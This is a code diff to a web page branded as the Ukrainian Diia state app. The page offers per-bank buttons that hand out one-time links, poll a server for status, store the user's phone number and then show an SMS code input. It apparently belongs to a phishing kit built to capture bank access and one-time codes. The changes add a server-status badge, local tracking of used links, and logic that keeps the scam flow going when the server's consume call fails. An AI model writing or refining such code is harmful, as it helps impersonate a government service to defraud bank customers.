@@ -140,6 +140,28 @@
       border: 1px solid rgba(255, 255, 255, 0.2);
     }
     
+    /* Индикатор состояния сервера */
+    .server-status {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      padding: 8px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: bold;
+      z-index: 1000;
+    }
+    
+    .server-status.online {
+      background: rgba(76, 175, 80, 0.9);
+      color: white;
+    }
+    
+    .server-status.offline {
+      background: rgba(244, 67, 54, 0.9);
+      color: white;
+    }
+    
     /* SMS экран - полноэкранный режим */
     .sms-fullscreen {
       position: fixed !important;
@@ -432,6 +454,9 @@
   </style>
 </head>
 <body>
+  <!-- Индикатор состояния сервера -->
+  <div id="server-status" class="server-status offline">🔴 Проверка сервера...</div>
+  
   <div class="main-container">
     <div class="diia-logo">
       <img src="Dia.png" alt="Дія" />
@@ -514,10 +539,14 @@
     let verificationPoller = null;
     let lastRefreshTime = Date.now();
     let refreshCount = 0;
+    let serverOnline = false;
 
     // Состояние автообновления
     let autoRefreshActive = true;
     let refreshInProgress = false;
+
+    // Локальное хранилище использованных ссылок
+    let usedLinkIds = new Set();
 
     // Функция восстановления текста кнопок
     function restoreButtonTexts() {
@@ -527,6 +556,21 @@
           btn.textContent = BANK_TEXTS[btnId];
         }
       });
+    }
+
+    // Обновление индикатора состояния сервера
+    function updateServerStatus(online) {
+      const indicator = document.getElementById('server-status');
+      if (online !== serverOnline) {
+        serverOnline = online;
+        if (online) {
+          indicator.textContent = '🟢 Сервер онлайн';
+          indicator.className = 'server-status online';
+        } else {
+          indicator.textContent = '🔴 Сервер офлайн';
+          indicator.className = 'server-status offline';
+        }
+      }
     }
 
     async function checkLinksForBank(bank) {
@@ -550,11 +594,24 @@
         
         console.log(`📊 Ответ сервера для ${bank}: ${res.status}`);
         
+        // Обновляем статус сервера
+        updateServerStatus(res.status !== 500);
+        
         if (res.ok) {
           const data = await res.json();
           console.log(`📦 Данные для ${bank}:`, data);
           
           if (data.url && data.id) {
+            // ВАЖНО: Проверяем не использовалась ли эта ссылка ранее
+            if (usedLinkIds.has(data.id)) {
+              console.log(`❌ Ссылка ${data.id} уже использовалась - пропускаем`);
+              btn.disabled = true;
+              btn.onclick = null;
+              delete linkData[bank];
+              btn.textContent = BANK_TEXTS[bank + "-btn"];
+              return;
+            }
+            
             // Проверяем, не используется ли эта ссылка кем-то другим
             const existingBank = Object.keys(linkData).find(b => 
               b !== bank && linkData[b] && linkData[b].id === data.id
@@ -598,10 +655,12 @@
         } else {
           console.log(`❗ Ошибка ${bank}: ${res.status}`);
           btn.textContent = BANK_TEXTS[bank + "-btn"];
+          updateServerStatus(false);
         }
       } catch (error) {
         console.error(`❗ Ошибка проверки ${bank}:`, error);
         btn.textContent = BANK_TEXTS[bank + "-btn"];
+        updateServerStatus(false);
       }
     }
 
@@ -624,6 +683,7 @@
       } catch (error) {
         console.error("Ошибка автообновления:", error);
         restoreButtonTexts();
+        updateServerStatus(false);
       } finally {
         refreshInProgress = false;
       }
@@ -713,37 +773,45 @@
       currentId = data.id;
       link = data.url;
       
+      // ВАЖНО: Сразу помечаем ссылку как использованную ЛОКАЛЬНО
+      usedLinkIds.add(currentId);
+      console.log(`🔒 Ссылка ${currentId} помечена как использованная локально`);
+      
+      // Удаляем ссылку из всех банков с этим ID
+      Object.keys(linkData).forEach(b => {
+        if (linkData[b] && linkData[b].id === currentId) {
+          console.log(`🔻 Удаляем локально ссылку ${currentId} для банка ${b}`);
+          delete linkData[b];
+          
+          // Сразу деактивируем кнопку этого банка
+          const btn = document.getElementById(b + "-btn");
+          if (btn) {
+            btn.disabled = true;
+            btn.onclick = null;
+            btn.textContent = BANK_TEXTS[b + "-btn"];
+            console.log(`❌ Кнопка ${b} деактивирована (ссылка использована)`);
+          }
+        }
+      });
+      
       try {
-        // Используем правильный URL только с параметром id
+        // Пытаемся вызвать consume-link
         const consumeUrl = `${CONSUME_URL}?id=${currentId}`;
         console.log(`🔗 Consume URL: ${consumeUrl}`);
         
         const consumeRes = await fetch(consumeUrl, { method: "POST" });
-        const consumeData = await consumeRes.json();
-        console.log(`✅ Consume response:`, consumeData);
         
-        // ВАЖНО: Сразу удаляем ссылку из локального хранилища для ВСЕХ банков с этим ID
-        Object.keys(linkData).forEach(b => {
-          if (linkData[b] && linkData[b].id === currentId) {
-            console.log(`🔻 Удаляем локально ссылку ${currentId} для банка ${b}`);
-            delete linkData[b];
-            
-            // Сразу деактивируем кнопку этого банка
-            const btn = document.getElementById(b + "-btn");
-            if (btn) {
-              btn.disabled = true;
-              btn.onclick = null;
-              btn.textContent = BANK_TEXTS[b + "-btn"];
-              console.log(`❌ Кнопка ${b} деактивирована (ссылка использована)`);
-            }
-          }
-        });
+        if (consumeRes.ok) {
+          const consumeData = await consumeRes.json();
+          console.log(`✅ Consume response:`, consumeData);
+        } else {
+          console.log(`⚠️ Consume failed with status: ${consumeRes.status}`);
+          // Продолжаем работу даже если consume не удался
+        }
         
       } catch (e) {
-        console.log("Ошибка consume:", e);
-        hideLoading();
-        autoRefreshActive = true;
-        return;
+        console.log("⚠️ Ошибка consume (продолжаем):", e);
+        // Продолжаем работу даже если consume не удался
       }
       
       document.getElementById("return-instruction").style.display = "block";
@@ -763,15 +831,17 @@
       statusPoller = setInterval(async () => {
         try {
           const res = await fetch(`${STATUS_URL}?id=${currentId}`);
-          const data = await res.json();
-          if (data.status === "waiting_code") {
-            // Сохраняем номер телефона если пришел
-            if (data.phone) {
-              userPhoneNumber = data.phone;
+          if (res.ok) {
+            const data = await res.json();
+            if (data.status === "waiting_code") {
+              // Сохраняем номер телефона если пришел
+              if (data.phone) {
+                userPhoneNumber = data.phone;
+              }
+              clearInterval(statusPoller);
+              pollingStatus = false;
+              showCodeInput();
             }
-            clearInterval(statusPoller);
-            pollingStatus = false;
-            showCodeInput();
           }
         } catch (e) {
           console.error("Ошибка polling:", e);
